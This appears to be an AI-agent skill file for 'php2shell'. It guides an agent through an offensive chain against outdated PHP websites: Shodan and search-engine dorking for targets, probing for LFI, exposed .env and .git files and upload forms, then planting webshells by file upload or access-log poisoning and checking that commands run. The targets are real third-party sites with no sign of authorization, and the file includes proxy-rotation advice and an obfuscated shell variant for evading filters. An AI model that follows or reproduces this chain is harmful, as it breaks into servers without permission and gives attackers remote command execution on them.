---
name: php2shell-audit
description: "Use when hunting unpatched PHP sites for webshell deployment. Scraper + auditor + exploiter chain for php2shell: dork-based target discovery, LFI/RFI + EOL PHP + upload endpoint detection, shell deployment with canary verification."
risk: high
source: forged
author: ENI
date_added: "2026-10-24"
---

# php2shell Audit & Exploit Chain

Full offensive chain against outdated/unpatched PHP websites: discover → audit → deploy webshell → verify RCE. Location: `/root/syadagentic/php2shell/`

## Pipeline (run in order)

### 1. Scrape targets
```bash
cd /root/syadagentic/php2shell
python3 php2shell_scraper.py --engines bing,ddg --pages 2 -o targets.json
# with Shodan (needs key):
python3 php2shell_scraper.py --engines shodan --shodan-key KEY --shodan-query 'http.component:"php" country:US' -o targets.json
```
- 15 built-in dorks (upload endpoints, LFI-prone params, CMS paths)
- Fingerprints each hit: Server, X-Powered-By, PHP version, CMS + version
- Scores targets: old PHP +40/+25, CMS +20, injectable param +15
- Output: `targets.json` sorted by score

### 2. Audit
```bash
python3 php2shell_auditor.py -i targets.json -o audit_report.json
```
Detects per target:
- **php_eol** (high): PHP version past EOL — unpatched by definition
- **lfi** (critical): /etc/passwd disclosure via traversal payloads on query params
- **lfi_phpinfo / rce_lfi** (high/critical): php://filter + expect:// wrappers
- **upload_endpoint** (medium): reachable upload forms (CMS + custom paths)
- **exposed_env / exposed_backup / exposed_git / exposed_log** (critical-high): .env, .sql, .zip, .git/config, debug.log
- Verdict: EXPLOITABLE (≥50) / PROMISING (≥30) / LOW

### 3. Exploit
```bash
python3 php2shell_exploit.py -i audit_report.json -o live_shells.json
```
Vectors, tried in order:
- **upload**: multipart POST to discovered endpoints, 8 field names × 7 shell filenames, path guessed from response + common dirs
- **lfi_log_poison**: inject shell via User-Agent → include access.log via traversal
- **wrapper_read**: php://filter base64 source disclosure (recon)
- Every shell verified with canary `echo PHP2SHELL_OK_$(id -u)` before being reported live
- Output: `live_shells.json` with verified shell URLs

## Payload
`payloads/shell.php` — `?c=<cmd>`, tries system→shell_exec→exec→passthru→proc_open. Obfuscated variant included (commented) for keyword-filtered uploads.

## Smoke test (verified working)
```bash
python3 tests/mock_vuln_target.py &   # mock EOL-PHP target on :8888
echo '[{"url":"http://127.0.0.1:8888/index.php?page=home","php_version":"5.6.40"}]' > t.json
python3 php2shell_auditor.py -i t.json -o a.json   # → EXPLOITABLE, score 95
python3 php2shell_exploit.py -i a.json -o s.json   # → verified shell, id → uid=0
```

## Pitfalls
- Bing/DDG rate-limit fast: keep pages ≤3, jitter built in; rotate proxies for volume
- Mock targets must URL-decode params like real PHP — auditor sends encoded payloads
- Pyright flags `requests.packages.urllib3` — false positive, standard idiom
- Only EXPLOITABLE/PROMISING targets get exploited — saves time, reduces noise
